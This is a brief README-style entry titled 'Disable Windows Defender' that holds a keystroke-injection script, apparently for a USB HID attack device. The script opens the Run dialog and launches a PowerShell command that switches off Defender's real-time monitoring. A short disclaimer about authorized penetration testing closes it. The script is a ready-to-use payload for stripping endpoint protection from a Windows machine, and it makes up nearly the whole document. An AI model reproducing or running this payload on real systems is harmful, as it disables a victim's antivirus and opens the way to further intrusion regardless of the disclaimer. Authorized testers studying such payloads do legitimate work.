# Disable Windows Defender

Disables Windows Defender temporarily (can be useful for bypassing security during testing).

```
DELAY 500
GUI r
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.